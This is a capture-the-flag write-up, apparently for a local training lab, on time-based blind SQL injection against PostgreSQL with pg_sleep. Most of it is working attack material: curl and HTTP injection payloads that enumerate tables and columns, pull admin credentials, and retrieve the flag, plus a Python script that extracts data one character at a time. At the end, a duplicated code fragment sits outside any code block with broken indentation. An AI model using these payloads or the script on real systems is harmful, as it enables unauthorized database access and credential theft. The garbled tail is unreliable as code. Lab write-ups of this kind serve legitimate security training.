# SQLi-031: PostgreSQL Time-based - pg_sleep - Writeup

## Flag: `FLAG{pg_sl33p_t1m3_bl1nd}`

---

## 🔍 Bước 1: DETECT

Test API key endpoint với time delay:

```bash
# Normal request - fast response
curl "http://localhost:5031/api/check?key=key_abc123"

# Test PostgreSQL pg_sleep
curl "http://localhost:5031/api/check?key=key_abc123'; SELECT pg_sleep(5)--"
```

→ Response chậm ~5s = **PostgreSQL Time-based Blind confirmed!**

---

## 🎯 Bước 2: IDENTIFY DATABASE

**PostgreSQL Syntax:**

- Time delay: `SELECT pg_sleep(5)`
- Conditional: `SELECT CASE WHEN (condition) THEN pg_sleep(3) END`

```bash
# Check database name
curl "http://localhost:5031/api/check?key=x'; SELECT CASE WHEN (current_database()='postgres') THEN pg_sleep(3) END--"
# ~3s delay → database = 'postgres'
```

→ Database: **postgres** (default)

---

## 🔢 Bước 3: ENUMERATE TABLES

### 3.1. Đếm số bảng

```http
GET /api/check?key=x'; SELECT CASE WHEN ((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')=3) THEN pg_sleep(5) END-- HTTP/1.1
```

→ ~5s delay → Có **3 bảng**

### 3.2. Lấy tên bảng (PostgreSQL hỗ trợ LIMIT OFFSET)

**Bảng 1:**

```http
GET /api/check?key=x'; SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0),1,1)='§a§') THEN pg_sleep(5) END-- HTTP/1.1
```

**Bảng 2:**

```http
GET /api/check?key=x'; SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1),1,1)='§a§') THEN pg_sleep(5) END-- HTTP/1.1
```

**Bảng 3:**

```http
GET /api/check?key=x'; SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 2),1,1)='§f§') THEN pg_sleep(5) END-- HTTP/1.1
```

**Kết quả:**

- admin_creds
- api_users
- flags

---

## 🗂️ Bước 4: ENUMERATE COLUMNS

**Columns của bảng `flags`:**

```http
GET /api/check?key=x'; SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 0),1,1)='§i§') THEN pg_sleep(5) END-- HTTP/1.1
```

**Kết quả:**

- id
- name
- value

---

## 📤 Bước 5: EXTRACT PASSWORD

```http
GET /api/check?key=x'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM admin_creds LIMIT 1 OFFSET 0),1,1)='§P§') THEN pg_sleep(5) END-- HTTP/1.1
```

**Credentials:**

- pg_admin : PG_Sl33p_Adm1n!
- api_user : AP1_Us3r_2024

---

## 🏆 Bước 6: EXFILTRATE FLAG

```http
GET /api/check?key=x'; SELECT CASE WHEN (SUBSTRING((SELECT value FROM flags WHERE name='sqli_031'),1,1)='§F§') THEN pg_sleep(5) END-- HTTP/1.1
```

🎉 **FLAG:** `FLAG{pg_sl33p_t1m3_bl1nd}`

---

## 🤖 Exploit Script

```python
import requests
import time

URL = "http://localhost:5031/api/check"
DELAY = 3
THRESHOLD = 2.5

def check(condition):
    start = time.time()
    payload = f"x'; SELECT CASE WHEN ({condition}) THEN pg_sleep({DELAY}) END--"
    try:
        r = requests.get(URL, params={"key": payload}, timeout=10)
        elapsed = time.time() - start
        return elapsed > THRESHOLD
    except:
        return False

def extract_string(query, max_len=100):
    result = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_{}-@!#$%^&*()"

    for pos in range(1, max_len + 1):
        found = False
        for char in charset:
            condition = f"SUBSTRING(({query}),{pos},1)='{char}'"
            print(f"[*] Position {pos}: '{char}'...", end='\r')

            if check(condition):
                result += char
                print(f"[+] Found: {result}                    ")
                found = True
                break

        if not found:
            break

    return result

# Extract flag
print("[*] Extracting flag...")
flag_query = "SELECT value FROM flags WHERE name='sqli_031'"
flag = extract_string(flag_query, max_len=40)
print(f"\n🎉 FLAG: {flag}")
```

---

## 🔑 PostgreSQL Key Points

| Feature      | PostgreSQL Syntax                            |
| ------------ | -------------------------------------------- |
| Time delay   | `pg_sleep(5)`                                |
| Conditional  | `CASE WHEN (condition) THEN pg_sleep(5) END` |
| Pagination   | `LIMIT 1 OFFSET n`                           |
| Current DB   | `current_database()`                         |
| Current User | `current_user`                               |
| Comments     | `--`, `/**/` (NO # symbol)                   |

    start = time.time()
    payload = f"key_abc123'; SELECT CASE WHEN ({cond}) THEN pg_sleep(2) END--"
    requests.get(f"http://localhost:5031/api/check?key={payload}")
    return time.time() - start > 1.5

flag = ""
for pos in range(1, 30):
for c in "FLAG{}\_0123456789abcdefghijklmnopqrstuvwxyz":
if check(f"(SELECT SUBSTRING(value,{pos},1) FROM flags)='{c}'"):
flag += c
print(f"[+] {flag}")
break

```

```
